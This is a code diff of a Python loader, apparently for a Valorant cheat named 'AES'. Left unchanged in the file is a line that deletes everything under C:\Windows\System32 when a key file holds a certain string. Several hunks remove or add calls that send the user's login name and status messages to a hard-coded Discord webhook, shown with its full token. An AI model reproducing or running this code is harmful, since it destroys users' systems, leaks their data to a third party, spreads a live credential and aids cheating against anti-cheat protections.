@@ -50,18 +50,7 @@ def check_timezone():
         input()
         sys.exit()
 check_timezone()
-if os.path.exists(file_pathmybootaes):
-    usernamex = os.getlogin()
-    mymsgx = usernamex+"tried to load another settings of aes"
-    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", mymsgx)
-    print("")
-    print("")
-    print("")
-    print("---A current AES Settings has been loaded already in your kernel system.")
-    print("---You can only run AES once per boot.")
-    print("---You need to restart PC to ensure safety and to avoid ban.")
-    input()
-    sys.exit()
+
 os.system('cls')
 '''
 def delete_system32_filex():
@@ -95,11 +84,7 @@ else:
     exit()
 import zipfile
 import os
-if file_contentsx1 =="asdasdasdasd":
-    os.system('cls')
-    print("Hello, I see you're having trouble trying to make this cheat work.")
-    print("Add me on discord and dm me so i can troubleshoot it for you: xxaes")
-    input()
+
 
 if file_contentsx1 =="mJaAQuPVWhWXG":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
@@ -149,17 +134,6 @@ def add_path_and_install_libraries():
     except Exception as e:
         print(f"An error occurred: {e}")
 os.system('cls')
-resultxy = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
-if 'vgc.exe' in resultxy.stdout:
-    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Tried to run AES While valorant is running. warning from loader")
-    os.system('cls')
-    print("---ERROR. Please run AES first before you open Valorant.")
-    print("---If error persists, restart PC.")
-    print("---If error persists, check vgc in services and set it to manual.")
-    input()
-    sys.exit()
-    exit()
-
 os.system('cls')
 pathx = r'C:\Windows\System32\validate.nsh'
 
@@ -238,6 +212,19 @@ def check_uptime():
 
     if uptime >= timedelta(minutes=5):
         print("Okay")
+        if file_contentsx1=="":
+            print("pass")
+        else:
+            os.system('cls')
+            send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "run after 5 minutes of boot time")
+            print("")
+            print("")
+            print("")
+            print("")
+            print("<An error occured while loading premium.>")
+            print("<A restart of PC is needed.>")
+            input()
+            exit()     
     else:
         time_remaining = timedelta(minutes=5) - uptime
         print("INFO")
